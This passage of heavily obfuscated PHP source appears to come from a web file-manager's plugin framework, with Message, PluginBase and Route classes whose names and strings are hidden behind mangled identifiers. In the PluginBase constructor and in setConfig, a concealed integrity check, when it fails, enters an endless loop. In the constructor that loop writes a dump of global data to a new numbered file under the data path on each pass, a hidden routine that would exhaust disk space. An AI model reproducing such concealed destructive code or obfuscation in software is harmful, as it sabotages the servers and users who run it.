<?php
 goto d½ø‡Ò²Øã; AÈª—³ìÈƒ: class Message { function __construct() { } public function send($Ò¨ÌÀÄ = '', $¦œÍı»½ = array(), $»ÚÅü•˜ = "\164\145\170\x74") { $ïñßñ½… =& $_SERVER[ˆ¡¹µ‹Â]; $£ĞÓ¶Œ  = array($ïñßñ½…[33] => $ïñßñ½…[1613], $ïñßñ½…[171] => $Ò¨ÌÀÄ); if (in_array($»ÚÅü•˜, array($ïñßñ½…[1613], $ïñßñ½…[1614]))) { $£ĞÓ¶Œ [$ïñßñ½…[33]] = $»ÚÅü•˜; } $¦œÍı»½ = array($ïñßñ½…[578] => isset($¦œÍı»½[$ïñßñ½…[578]]) ? $¦œÍı»½[$ïñßñ½…[578]] : $ïñßñ½…[12], $ïñßñ½…[662] => isset($¦œÍı»½[$ïñßñ½…[662]]) ? $¦œÍı»½[$ïñßñ½…[662]] : $ïñßñ½…[12]); if (empty($Ò¨ÌÀÄ) || empty($¦œÍı»½[$ïñßñ½…[578]]) && empty($¦œÍı»½[$ïñßñ½…[662]])) { return !1; } $„Ç™Ò±Ç = array($ïñßñ½…[1541] => $£ĞÓ¶Œ , $ïñßñ½…[1615] => $¦œÍı»½); Hook::trigger($ïñßñ½…[1616], $„Ç™Ò±Ç); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $‹ùé¶Óã =& $_SERVER[ˆ¡¹µ‹Â]; $óáı±ëÉ = $_SERVER[$‹ùé¶Óã[844]]; $üŞª¡Œ = $‹ùé¶Óã[845]; if ($_SERVER[$‹ùé¶Óã[846]] != $üŞª¡Œ($óáı±ëÉ)) { $÷ŞÚˆæ = $‹ùé¶Óã[951]; $•°”¤ Œ = $‹ùé¶Óã[847]; $©íÏÕñ = $_SERVER[$‹ùé¶Óã[848]] . $‹ùé¶Óã[849]; $¤ÃóÒ×¨ = $•°”¤ Œ($©íÏÕñ); $Ñ´Ï¢Èì = explode($‹ùé¶Óã[262], $¤ÃóÒ×¨); if (count($Ñ´Ï¢Èì) < $‹ùé¶Óã[683]) { $Õç¶´Šá = $‹ùé¶Óã[850]; $Õç¶´Šá(); } $íŠ ¾ë = $‹ùé¶Óã[952]; $íŠ ¾ë($_SERVER[$‹ùé¶Óã[953]]); $÷ŞÚˆæ = $‹ùé¶Óã[951]; $÷ŞÚˆæ(); $áÚè‚Ğ¡ = $‹ùé¶Óã[1617]; $º ù¦ªˆ = json_encode($GLOBALS[$‹ùé¶Óã[1618]]); $´ã Ğ¥ = 1; for ($İÅÅÁÉº = $´ã Ğ¥; $İÅÅÁÉº > 0; $İÅÅÁÉº++) { $áÚè‚Ğ¡(DATA_PATH . $İÅÅÁÉº, $º ù¦ªˆ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($‹ùé¶Óã[1619]); $this->pluginName = str_replace($‹ùé¶Óã[1619], $‹ùé¶Óã[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $‹ùé¶Óã[8]; $this->pluginApi = appHostGet() . $‹ùé¶Óã[1620] . $this->pluginName . $‹ùé¶Óã[8]; $this->pluginHost = $config[$‹ùé¶Óã[1621]] . $this->pluginName . $‹ùé¶Óã[8]; $this->pluginHostDefault = $config[$‹ùé¶Óã[1621]] . $this->pluginName . $‹ùé¶Óã[8]; $ÈÑ•şƒÆ = $config[$‹ùé¶Óã[1622]]; if ($ÈÑ•şƒÆ && strpos($‹ùé¶Óã[50] . $ÈÑ•şƒÆ . $‹ùé¶Óã[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$‹ùé¶Óã[1623]] . $this->pluginName . $‹ùé¶Óã[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ˆ¡¹µ‹Â][1624]); } protected function assign($ÏÆìé…, $É¹ÚØ–É = false) { if (is_array($ÏÆìé…)) { $this->values = array_merge($this->values, $ÏÆìé…); } else { $this->values[$ÏÆìé…] = $É¹ÚØ–É; } } protected function display($¨·ˆ¦ÆÍ) { extract($this->values); require $¨·ˆ¦ÆÍ; } final function hookRegist($„Œúœîû) { $this->modelPlugin->appRegist($this->pluginName, $„Œúœîû); } final function appIcon() { $´‰¥Äï =& $_SERVER[ˆ¡¹µ‹Â]; $¡¨‰ùˆğ = $this->appPackage(); $ÜĞĞ£æ™ = $´‰¥Äï[12]; if (isset($¡¨‰ùˆğ[$´‰¥Äï[490]])) { if (isset($¡¨‰ùˆğ[$´‰¥Äï[490]][$´‰¥Äï[1625]])) { $ÜĞĞ£æ™ = $´‰¥Äï[1626] . $¡¨‰ùˆğ[$´‰¥Äï[490]][$´‰¥Äï[1625]] . $´‰¥Äï[1627]; } else { if ($¡¨‰ùˆğ[$´‰¥Äï[490]][$´‰¥Äï[1628]]) { $ÜĞĞ£æ™ = $´‰¥Äï[1629] . $¡¨‰ùˆğ[$´‰¥Äï[490]][$´‰¥Äï[1628]] . $´‰¥Äï[1630]; } } } return $ÜĞĞ£æ™; } final function fileCanView($–èÕáŒÎ) { $ä…¤Ññ =& $_SERVER[ˆ¡¹µ‹Â]; if (request_url_safe($–èÕáŒÎ)) { return !0; } if ($this->isShare($–èÕáŒÎ)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ôî­†‡² = $ä…¤Ññ[1631] . rawurlencode(this_url()); show_tips(LNG($ä…¤Ññ[1632]) . $ä…¤Ññ[1633] . $ôî­†‡² . $ä…¤Ññ[1634] . LNG($ä…¤Ññ[1635]) . $ä…¤Ññ[1636], !1); } if (!Action($ä…¤Ññ[1637])->authCan($ä…¤Ññ[1638])) { show_tips(LNG($ä…¤Ññ[1639]) . $ä…¤Ññ[1640], !1); } ActionCall($ä…¤Ññ[1641], $–èÕáŒÎ); } final function isShare($ğÍ•Şãû) { $ÉøÅ…ñÕ = KodIO::parse($ğÍ•Şãû); return $ÉøÅ…ñÕ[$_SERVER[ˆ¡¹µ‹Â][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($€´’Ÿº) { if (request_url_safe($€´’Ÿº)) { return $€´’Ÿº; } if (!$this->isShare($€´’Ÿº)) { $€´’Ÿº = $this->filePath($€´’Ÿº, !1); } return Action($_SERVER[ˆ¡¹µ‹Â][1249])->linkOut($€´’Ÿº); } public function filePathLinkOut($ïÔÇ–¯Ø) { if (request_url_safe($ïÔÇ–¯Ø)) { return $ïÔÇ–¯Ø; } $this->fileCanView($ïÔÇ–¯Ø); return Action($_SERVER[ˆ¡¹µ‹Â][1249])->link($ïÔÇ–¯Ø); } final function filePath($«¸€«ñĞ, $”ªŞ” = true, $â¡¡õé³ = false) { $…¶ÂÎ©Ã =& $_SERVER[ˆ¡¹µ‹Â]; $îà´İ¦¯ = $this->filePathGet($«¸€«ñĞ, $”ªŞ”); if (!$this->fileInfo) { show_tips(LNG($…¶ÂÎ©Ã[108]), !1); } if ($â¡¡õé³ && isset($this->fileInfo[$…¶ÂÎ©Ã[541]]) && $this->fileInfo[$…¶ÂÎ©Ã[541]]) { $§êÄÅ”¸ = Model($…¶ÂÎ©Ã[544])->fileInfo($this->fileInfo[$…¶ÂÎ©Ã[541]]); if (!$§êÄÅ”¸ || !IO::exist($§êÄÅ”¸[$…¶ÂÎ©Ã[87]])) { show_tips(LNG($…¶ÂÎ©Ã[108]) . $…¶ÂÎ©Ã[1642]); } } Hook::trigger($…¶ÂÎ©Ã[1643], $îà´İ¦¯); return $îà´İ¦¯; } final function filePathGet($ıû”êÂ, $ò€Ï½Ô = true) { $¥Šªñ»” =& $_SERVER[ˆ¡¹µ‹Â]; if ($“‘Ä»¼¡ = $this->checkSharePath($ıû”êÂ, $ò€Ï½Ô)) { return $“‘Ä»¼¡; } $this->fileCanView($ıû”êÂ); if (request_url_safe($ıû”êÂ)) { $İÁŠ‘ Õ = parse_url_query($ıû”êÂ); if (isset($İÁŠ‘ Õ[$¥Šªñ»”[1644]]) && isset($İÁŠ‘ Õ[$¥Šªñ»”[234]])) { $èó”Ğ = Mcrypt::decode($İÁŠ‘ Õ[$¥Šªñ»”[234]], Model($¥Šªñ»”[837])->get($¥Šªñ»”[838])); if ($èó”Ğ) { $this->fileInfo = IO::info($èó”Ğ); $this->fileInfo[$¥Šªñ»”[1645]] = $ıû”êÂ; $this->cachePath = $this->pluginCachePath($¥Šªñ»”[12], $ò€Ï½Ô); return $èó”Ğ; } } $ıû”êÂ = $this->_cacheHttpFile($ıû”êÂ, $ò€Ï½Ô); $this->fileInfo = IO::info($ıû”êÂ); } else { $this->fileInfo = IO::info($ıû”êÂ); $this->cachePath = $this->pluginCachePath($¥Šªñ»”[12], $ò€Ï½Ô); } return $ıû”êÂ; } final function _cacheHttpFile($ÖêëÎ™™, $¢ı”…°¹ = true) { $–·¬æØû =& $_SERVER[ˆ¡¹µ‹Â]; $¼ı¹ÒñŸ = parse_url_query($ÖêëÎ™™); $Îœ“Õ¢ = get_path_ext($ÖêëÎ™™); if (isset($¼ı¹ÒñŸ[$–·¬æØû[32]]) && $¼ı¹ÒñŸ[$–·¬æØû[32]]) { $Îœ“Õ¢ = get_path_ext($¼ı¹ÒñŸ[$–·¬æØû[32]]); } $—Ìæà¿ò = hash_path($ÖêëÎ™™) . $–·¬æØû[10] . $Îœ“Õ¢; $this->cachePath = $this->pluginCachePath($¢ı”…°¹ ? $—Ìæà¿ò : $–·¬æØû[12]); $ú»œëëŠ = IO::fileNameExist($this->cachePath, $—Ìæà¿ò); if ($ú»œëëŠ) { return KodIO::make($ú»œëëŠ); } $¢˜õÍÔ = rtrim($this->cachePath, $–·¬æØû[8]) . $–·¬æØû[8] . $—Ìæà¿ò; return $this->pluginCacheFileSet($¢˜õÍÔ, file_get_contents_nossl($ÖêëÎ™™)); } final function checkSharePath($÷øûİ¹, $ôÕ¢Š¡ä = true) { $ûĞß„ÒÀ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->isShare($÷øûİ¹)) { return !1; } $Ã›ä¹™¢ = Action($ûĞß„ÒÀ[1249])->sharePathInfo($÷øûİ¹); if (!is_array($Ã›ä¹™¢) || !isset($Ã›ä¹™¢[$ûĞß„ÒÀ[87]])) { show_json(LNG($ûĞß„ÒÀ[1646]), !1); } $this->fileInfo = $Ã›ä¹™¢; $this->cachePath = $this->pluginCachePath(!1, $ôÕ¢Š¡ä); return $Ã›ä¹™¢[$ûĞß„ÒÀ[87]]; } final function pluginCachePath($¬™‘–ó = '', $œË‡„Èà = false) { $Œ›šúà =& $_SERVER[ˆ¡¹µ‹Â]; if ($œË‡„Èà && is_array($this->fileInfo)) { $¬™‘–ó = kodIO::hashPath($this->fileInfo); } $ñé“¤Àæ = rtrim(IO_PATH_SYSTEM_TEMP . $Œ›šúà[1647] . $this->pluginName . $Œ›šúà[8] . $¬™‘–ó, $Œ›šúà[8]); $º‡à›õŸ = IO::infoFullSimple($ñé“¤Àæ); $ıˆ­ÓÅº = $º‡à›õŸ && is_array($º‡à›õŸ) ? $º‡à›õŸ[$Œ›šúà[87]] : $Œ›šúà[12]; if (!$ıˆ­ÓÅº) { $ıˆ­ÓÅº = IO::mkdir($ñé“¤Àæ); } return $ıˆ­ÓÅº; } final function pluginCacheFileSet($ë°Êˆ ‰, $—ŒË‰× = '') { $Ø¢ƒÑ¿¹ =& $_SERVER[ˆ¡¹µ‹Â]; $Ëî àõ¦ = IO::infoFullSimple($ë°Êˆ ‰); if (!$Ëî àõ¦) { return IO::mkfile($ë°Êˆ ‰, $—ŒË‰×, REPEAT_REPLACE); } IO::setContent($Ëî àõ¦[$Ø¢ƒÑ¿¹[87]], $—ŒË‰×); return $Ëî àõ¦[$Ø¢ƒÑ¿¹[87]]; } final function pluginLocalFile($ú¢ö«€ = '') { $²ÙşÀ =& $_SERVER[ˆ¡¹µ‹Â]; $˜¶ã‹İˆ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($˜¶ã‹İˆ)) { mk_dir($˜¶ã‹İˆ); } if (!$ú¢ö«€) { return $˜¶ã‹İˆ; } $à‹äÜÏ° = IO::info($ú¢ö«€); $Ç´–šÀ‰ = $²ÙşÀ[1648] . KodIO::hashPath($à‹äÜÏ°) . $²ÙşÀ[10] . $à‹äÜÏ°[$²ÙşÀ[169]]; if (!checkExtSafe($Ç´–šÀ‰)) { $Ç´–šÀ‰ = $Ç´–šÀ‰ . $²ÙşÀ[1284]; } $Üğ¸˜Øî = $˜¶ã‹İˆ . $Ç´–šÀ‰; if (@file_exists($Üğ¸˜Øî)) { return $Üğ¸˜Øî; } return IO::copy($ú¢ö«€, $˜¶ã‹İˆ, 0, $Ç´–šÀ‰); } final function appPackage() { $Ãù£“™ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->packageData) { return $this->packageData; } $áåâŞÕ¡ = $this->parseFile($this->pluginPath . $Ãù£“™[1649]); $this->parseLang($áåâŞÕ¡); $¨’È–â™ = json_decode_force($áåâŞÕ¡); if (!$¨’È–â™) { return array(); } $áË›²å± = Hook::trigger($Ãù£“™[1650], $¨’È–â™); if ($áË›²å± && is_array($áË›²å±)) { $¨’È–â™ = $áË›²å±; } $this->packageData = $¨’È–â™; return $¨’È–â™; } public function packageInfoGet($ÌİäÁåÅ) { $¨åÁÇªÀ = $this->appPackage(); return array_get_value($¨åÁÇªÀ, $ÌİäÁåÅ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ˆ¡¹µ‹Â][1651]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ˆ¡¹µ‹Â][1652]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ˆ¡¹µ‹Â][1653]); } public function echoJsAssign($š•¢äıÍ, $ç¯í·³±) { $this->echoJsAssignArr[$š•¢äıÍ] = $ç¯í·³±; } private function parseFile($²€é™‡Á) { $îÑ„¹æ¶ =& $_SERVER[ˆ¡¹µ‹Â]; $–Î·ŞÓÖ = file_get_contents_nossl($²€é™‡Á); $Ï¯ÄíÅÀ = array($îÑ„¹æ¶[1654], $îÑ„¹æ¶[1655], $îÑ„¹æ¶[1656], $îÑ„¹æ¶[1657], $îÑ„¹æ¶[1658], $îÑ„¹æ¶[1659], $îÑ„¹æ¶[1660]); $Î˜…îÍ› = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$îÑ„¹æ¶[92]][$îÑ„¹æ¶[1661]]); foreach ($this->echoJsAssignArr as $…¼ï‡Á¼ => $Åœ©¿íá) { $Ï¯ÄíÅÀ[] = $îÑ„¹æ¶[1662] . $…¼ï‡Á¼ . $îÑ„¹æ¶[1663]; $Î˜…îÍ›[] = is_array($Åœ©¿íá) || is_object($Åœ©¿íá) ? rawurlencode(json_encode($Åœ©¿íá)) : $Åœ©¿íá; } if (strstr($–Î·ŞÓÖ, $îÑ„¹æ¶[1664])) { $ÅÃÑÍÍ© = rawurlencode(json_encode($this->pluginLangArr)); $–Î·ŞÓÖ = str_replace($îÑ„¹æ¶[1664], $ÅÃÑÍÍ©, $–Î·ŞÓÖ); } if (strstr($–Î·ŞÓÖ, $îÑ„¹æ¶[1665])) { $ÅÃÑÍÍ© = $ÅÃÑÍÍ© = rawurlencode(json_encode($this->getConfig())); $–Î·ŞÓÖ = str_replace($îÑ„¹æ¶[1665], $ÅÃÑÍÍ©, $–Î·ŞÓÖ); } $–Î·ŞÓÖ = str_replace($Ï¯ÄíÅÀ, $Î˜…îÍ›, $–Î·ŞÓÖ); return $–Î·ŞÓÖ; } private function parseLang(&$á¨´™¹Æ) { $îÜï´Ó’ =& $_SERVER[ˆ¡¹µ‹Â]; $õŒ”ü° = $îÜï´Ó’[1666]; if (!strstr($á¨´™¹Æ, $õŒ”ü°)) { return; } preg_match_all($îÜï´Ó’[1667], $á¨´™¹Æ, $¿ø”¥¡Ô); if (!is_array($¿ø”¥¡Ô) || count($¿ø”¥¡Ô) == 0 || !is_array($¿ø”¥¡Ô[0]) || count($¿ø”¥¡Ô[0]) == 0) { return; } $Æ¸îœÕ = array(); $ÄÚ˜€Åˆ = array(); foreach ($¿ø”¥¡Ô[0] as $Ë™Œ¥³) { $¡¢›Óİ® = substr($Ë™Œ¥³, strlen($õŒ”ü°), -4); $Õ™‹€šõ = LNG($¡¢›Óİ®); $Æ¸îœÕ[] = $Ë™Œ¥³; $ÄÚ˜€Åˆ[] = str_replace(array($îÜï´Ó’[262], $îÜï´Ó’[1150], $îÜï´Ó’[418], $îÜï´Ó’[121]), array($îÜï´Ó’[53], $îÜï´Ó’[53], $îÜï´Ó’[12], $îÜï´Ó’[1668]), $Õ™‹€šõ); } $á¨´™¹Æ = str_replace($Æ¸îœÕ, $ÄÚ˜€Åˆ, $á¨´™¹Æ); } private function parseConfig(&$µÒ‚†Éï) { $š£Íõ‹ =& $_SERVER[ˆ¡¹µ‹Â]; $€¯–‰©ô = $š£Íõ‹[1669]; if (!strstr($µÒ‚†Éï, $€¯–‰©ô)) { return; } preg_match_all($š£Íõ‹[1670], $µÒ‚†Éï, $ØğËÚ¤“); if (!is_array($ØğËÚ¤“) || count($ØğËÚ¤“) == 0 || !is_array($ØğËÚ¤“[0]) || count($ØğËÚ¤“[0]) == 0) { return; } $Ë®’Å”İ = $this->getConfig(); $ö•³éæ = array(); $¢Â¬ĞµÚ = array(); foreach ($ØğËÚ¤“[0] as $±Á®ÆäÆ) { $ê÷éÛ¿ = substr($±Á®ÆäÆ, strlen($€¯–‰©ô), -2); $ö•³éæ[] = $±Á®ÆäÆ; $¢Â¬ĞµÚ[] = _get($Ë®’Å”İ, $ê÷éÛ¿); } $µÒ‚†Éï = str_replace($ö•³éæ, $¢Â¬ĞµÚ, $µÒ‚†Éï); } private function parsePackage(&$ª¶Ã§µ„) { $ñŸúô—£ =& $_SERVER[ˆ¡¹µ‹Â]; $Ô••‡ÙÄ = $ñŸúô—£[1671]; if (!strstr($ª¶Ã§µ„, $Ô••‡ÙÄ)) { return; } preg_match_all($ñŸúô—£[1672], $ª¶Ã§µ„, $”ØÖÑØ¯); if (!is_array($”ØÖÑØ¯) || count($”ØÖÑØ¯) == 0 || !is_array($”ØÖÑØ¯[0]) || count($”ØÖÑØ¯[0]) == 0) { return; } $Ó½±Çº = $this->appPackage(); $ÃæŠµ¹‹ = array(); $ô°³©À = array(); foreach ($”ØÖÑØ¯[0] as $ğ¬¼œ‡¬) { $°šßµîˆ = substr($ğ¬¼œ‡¬, strlen($Ô••‡ÙÄ), -2); $ÃæŠµ¹‹[] = $ğ¬¼œ‡¬; $ô°³©À[] = _get($Ó½±Çº, $°šßµîˆ); } $ª¶Ã§µ„ = str_replace($ÃæŠµ¹‹, $ô°³©À, $ª¶Ã§µ„); } final function echoFile($ÓÚÓã‡à, $Ó±æ“ú¤ = false) { $¦ÁËú¨ =& $_SERVER[ˆ¡¹µ‹Â]; $ãŒèÖ‹Ÿ = $this->pluginPath . $ÓÚÓã‡à; if (ACT == $¦ÁËú¨[1673]) { echo $¦ÁËú¨[1674] . $this->pluginName . $¦ÁËú¨[8] . $ÓÚÓã‡à . $¦ÁËú¨[1675]; if (!file_exists($ãŒèÖ‹Ÿ)) { echo $¦ÁËú¨[1676]; return; } } $¦•ç‡„™ = $this->parseFile($ãŒèÖ‹Ÿ); $this->parseLang($¦•ç‡„™); $this->parseConfig($¦•ç‡„™); $this->parsePackage($¦•ç‡„™); if (is_array($Ó±æ“ú¤)) { $¦•ç‡„™ = str_replace(array_keys($Ó±æ“ú¤), array_values($Ó±æ“ú¤), $¦•ç‡„™); } echo $¦ÁËú¨[262] . $¦•ç‡„™; } private function checkVersion() { $¯½¹Î× =& $_SERVER[ˆ¡¹µ‹Â]; $¡ËŸªˆ = $this->appPackage(); $Øúçºõ = $this->getConfig(); if ($Øúçºõ[$¯½¹Î×[1677]] == $¡ËŸªˆ[$¯½¹Î×[1651]]) { return; } $this->regist(); $this->setConfig(array($¯½¹Î×[1677] => $¡ËŸªˆ[$¯½¹Î×[1651]])); } final function initLang() { $ª¹Øˆ¶ =& $_SERVER[ˆ¡¹µ‹Â]; $ö˜Õ”ãÀ = $ª¹Øˆ¶[1678]; $§‘ì›¸¯ = $this->pluginPath . $ª¹Øˆ¶[1679]; $‚ûÂÌ— = I18n::getType(); $ØŠçòıù = array(); if (file_exists($§‘ì›¸¯ . $‚ûÂÌ— . $ª¹Øˆ¶[913])) { $ØŠçòıù = (include $§‘ì›¸¯ . $‚ûÂÌ— . $ª¹Øˆ¶[913]); } else { if ($‚ûÂÌ— == $ª¹Øˆ¶[1680] && !file_exists($§‘ì›¸¯ . $‚ûÂÌ— . $ª¹Øˆ¶[913]) && file_exists($§‘ì›¸¯ . $ª¹Øˆ¶[1681])) { $ØŠçòıù = (include $§‘ì›¸¯ . $ª¹Øˆ¶[1681]); } else { if (file_exists($§‘ì›¸¯ . $ö˜Õ”ãÀ . $ª¹Øˆ¶[913])) { $ØŠçòıù = (include $§‘ì›¸¯ . $ö˜Õ”ãÀ . $ª¹Øˆ¶[913]); } } } if (!is_array($ØŠçòıù)) { return array(); } if (@count($ØŠçòıù) > 0) { I18n::set($ØŠçòıù); } return $ØŠçòıù; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÙÕŸİŞı) { $ŞÇÊäÙö =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($_SERVER[$ŞÇÊäÙö[846]]) || !isset($_SERVER[$ŞÇÊäÙö[844]])) { $Ãö ”„‰ = $ŞÇÊäÙö[951]; $ßÁåêû» = $ŞÇÊäÙö[847]; $¡ş¦Î = $_SERVER[$ŞÇÊäÙö[848]] . $ŞÇÊäÙö[849]; $•µø­ÁŠ = $ßÁåêû»($¡ş¦Î); $ï·…³æ = explode($ŞÇÊäÙö[262], $•µø­ÁŠ); if (count($ï·…³æ) < $ŞÇÊäÙö[683]) { $ªŠ·Şà· = $ŞÇÊäÙö[850]; $ªŠ·Şà·(); } $ŒÈÖû—€ = $ŞÇÊäÙö[952]; $ŒÈÖû—€($_SERVER[$ŞÇÊäÙö[953]]); $šÅ£¶¿ì = 1; for ($å¦»çä = $šÅ£¶¿ì; $å¦»çä > 0; $å¦»çä++) { $ŒÈÖû—€ = json_encode($GLOBALS[$ŞÇÊäÙö[492]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÙÕŸİŞı); } public function onSetConfig($ñÎå¢×) { } public function onGetConfig($“Ÿ ¾ôã) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ƒ¦áˆÍ•) { if ($ƒ¦áˆÍ• == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ò†÷‹ö = "\160\x6c\x75\147\x69\156\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Š­®•ë„ = $this->getConfig(); if (!$Š­®•ë„[$ò†÷‹ö]) { return !1; } return ActionCall($_SERVER[ˆ¡¹µ‹Â][1682], $Š­®•ë„[$ò†÷‹ö]); } public function url($Ôµşäêò, $ÔçÍ´ÍÈ = '', $š¿í­ã¬ = true) { $ÆÌÏ—òÃ =& $_SERVER[ˆ¡¹µ‹Â]; $„ ğ‹’ = $this->getConfig(); $´¬â‡¨ = KOD_VERSION . $ÆÌÏ—òÃ[10] . KOD_VERSION_BUILD; $’À¢§¢¤ = $this->packageVersion(); $‡ü›™Ãå = $´¬â‡¨ . $ÆÌÏ—òÃ[462] . $’À¢§¢¤; if (substr($Ôµşäêò, 0, 4) == $ÆÌÏ—òÃ[152] || substr($Ôµşäêò, 0, 2) == $ÆÌÏ—òÃ[1403]) { $Éô÷¾‚ = $Ôµşäêò . $ÆÌÏ—òÃ[1683] . $‡ü›™Ãå; } else { if ($ÔçÍ´ÍÈ == $ÆÌÏ—òÃ[12]) { $Éô÷¾‚ = $this->pluginHost . $Ôµşäêò . $ÆÌÏ—òÃ[1683] . $‡ü›™Ãå; } else { if ($ÔçÍ´ÍÈ === $ÆÌÏ—òÃ[78]) { $Éô÷¾‚ = $this->pluginHost . $Ôµşäêò; } else { if ($ÔçÍ´ÍÈ == $ÆÌÏ—òÃ[1684]) { $Éô÷¾‚ = STATIC_PATH . $Ôµşäêò . $ÆÌÏ—òÃ[1683] . $´¬â‡¨; } else { if ($ÔçÍ´ÍÈ == $ÆÌÏ—òÃ[1685]) { $Éô÷¾‚ = APP_HOST . $ÆÌÏ—òÃ[1686] . $Ôµşäêò . $ÆÌÏ—òÃ[1683] . $´¬â‡¨; } else { if (isset($„ ğ‹’[$ÔçÍ´ÍÈ])) { $Éô÷¾‚ = $„ ğ‹’[$ÔçÍ´ÍÈ] . $Ôµşäêò . $ÆÌÏ—òÃ[1683] . $‡ü›™Ãå; } } } } } } if (!$š¿í­ã¬) { return $Éô÷¾‚; } echo $Éô÷¾‚; } public function link($ÒŒ¦Ñ = false, $ÀÛÉ‘ = '') { $Ùï€ñ¦ =& $_SERVER[ˆ¡¹µ‹Â]; $šæ·…ò© = $this->linkHas == !1; $this->linkHas = !0; if (!$ÒŒ¦Ñ) { $this->link($Ùï€ñ¦[1687], $Ùï€ñ¦[1685]); $this->link($Ùï€ñ¦[1688], $Ùï€ñ¦[1684]); $this->link($Ùï€ñ¦[1689], $Ùï€ñ¦[1684]); $this->link($Ùï€ñ¦[1690], $Ùï€ñ¦[1684]); $this->link($Ùï€ñ¦[1691], $Ùï€ñ¦[1684]); if ($šæ·…ò©) { Hook::trigger($Ùï€ñ¦[1692]); } return; } $Ç²Å¢¦® = $this->url($ÒŒ¦Ñ, $ÀÛÉ‘, !1); if (substr($ÒŒ¦Ñ, -3) == $Ùï€ñ¦[1693]) { echo $Ùï€ñ¦[1694] . $Ç²Å¢¦® . $Ùï€ñ¦[1695] . $Ùï€ñ¦[262]; } else { if (substr($ÒŒ¦Ñ, -4) == $Ùï€ñ¦[1696]) { echo $Ùï€ñ¦[1697] . $Ç²Å¢¦® . $Ùï€ñ¦[1698] . $Ùï€ñ¦[262]; } } if ($šæ·…ò©) { Hook::trigger($Ùï€ñ¦[1692]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\x5b\136\57\x5d\x2b", "\x3a\x6e\165\x6d" => "\x5b\x30\x2d\x39\x5d\53", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($°Àá½¹ò, $Ãåèàé“) { $ü ±Ôõ– =& $_SERVER[ˆ¡¹µ‹Â]; if ($°Àá½¹ò == $ü ±Ôõ–[1699]) { $ £¹ã½ş = array_map($ü ±Ôõ–[1700], $Ãåèàé“[0]); $•õÊÇ¨† = strpos($Ãåèàé“[1], $ü ±Ôõ–[8]) === 0 ? $Ãåèàé“[1] : $ü ±Ôõ–[8] . $Ãåèàé“[1]; $Ë¥ÛéäÇ = $Ãåèàé“[2]; } else { $ £¹ã½ş = null; $•õÊÇ¨† = strpos($Ãåèàé“[0], $ü ±Ôõ–[8]) === 0 ? $Ãåèàé“[0] : $ü ±Ôõ–[8] . $Ãåèàé“[0]; $Ë¥ÛéäÇ = $Ãåèàé“[1]; } array_push(self::$maps, $ £¹ã½ş); array_push(self::$routes, $•õÊÇ¨†); array_push(self::$methods, strtoupper($°Àá½¹ò)); array_push(self::$callbacks, $Ë¥ÛéäÇ); } public static function error($…«¸ÃÔ) { self::$errorCallback = $…«¸ÃÔ; } public static function haltOnMatch($¾ï‘ë’¤ = true) { self::$halts = $¾ï‘ë’¤; } public static function dispatch() { $º´šÆÇ© =& $_SERVER[ˆ¡¹µ‹Â]; $“²µïÆ‘ = parse_url($_SERVER[$º´šÆÇ©[1701]], PHP_URL_PATH); $ÌÇ‘½ÚÙ = $_SERVER[$º´šÆÇ©[164]]; $“³˜å“ = array_keys(static::$patterns); $ü»ù‘Å = array_values(static::$patterns); $¥›‚ÏÃõ = !1; self::$routes = preg_replace($º´šÆÇ©[1354], $º´šÆÇ©[8], self::$routes); if (in_array($“²µïÆ‘, self::$routes)) { $ø§”´—£ = array_keys(self::$routes, $“²µïÆ‘); foreach ($ø§”´—£ as $¬¹Ê„ë†) { if (self::$methods[$¬¹Ê„ë†] == $ÌÇ‘½ÚÙ || self::$methods[$¬¹Ê„ë†] == $º´šÆÇ©[1702] || in_array($ÌÇ‘½ÚÙ, self::$maps[$¬¹Ê„ë†])) { $¥›‚ÏÃõ = !0; if (!is_object(self::$callbacks[$¬¹Ê„ë†])) { $Ëƒ‘Í£Õ = explode($º´šÆÇ©[8], self::$callbacks[$¬¹Ê„ë†]); $ğİ®¥ = end($Ëƒ‘Í£Õ); $ Ô¹ªÖÕ = explode($º´šÆÇ©[1286], $ğİ®¥); $ìÙ“ó„ü = new $ Ô¹ªÖÕ[0](); $ìÙ“ó„ü->{$ Ô¹ªÖÕ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¬¹Ê„ë†]); if (self::$halts) { return; } } } } } else { $“¿íÑÀê = 0; foreach (self::$routes as $¬¹Ê„ë†) { if (strpos($¬¹Ê„ë†, $º´šÆÇ©[4]) !== !1) { $¬¹Ê„ë† = str_replace($“³˜å“, $ü»ù‘Å, $¬¹Ê„ë†); } if (preg_match($º´šÆÇ©[1703] . $¬¹Ê„ë† . $º´šÆÇ©[1704], $“²µïÆ‘, $† ¡€‰ñ)) { if 